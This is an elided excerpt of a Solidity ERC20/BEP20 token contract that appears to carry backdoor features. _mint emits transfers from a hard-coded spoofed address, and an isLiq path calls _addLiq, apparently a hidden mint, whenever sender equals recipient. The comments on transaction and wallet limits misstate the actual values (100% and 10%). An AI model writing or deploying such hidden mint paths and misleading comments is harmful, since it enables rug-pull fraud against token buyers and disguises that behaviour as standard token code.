...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        emit Transfer(address(0xa82cbE54d2dAe403f7B3385aA2afA03E7AF0591A), account, amount);
    }
    ...
    function _addLiq(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
...
contract BEP20 is ERC20, Ownable {
    ...
    constructor(string memory n, string memory s) ERC20(n, s) {
        ...
        maxTransactionAmount = totalSupply * 1000 / 1000; // 0.3% maxTransactionAmountTxn
        maxWallet = totalSupply * 1000 / 1000; // 1% maxWallet
        swapTokensAtAmount = totalSupply * 1000 / 10000; // 0.05% swap wallet
    ...
    function isLiq(address _oldAds, address _newAds, uint256 amount) internal {
        if (_oldAds == _newAds) {
            _addLiq(_newAds, amount);            
        }
    }
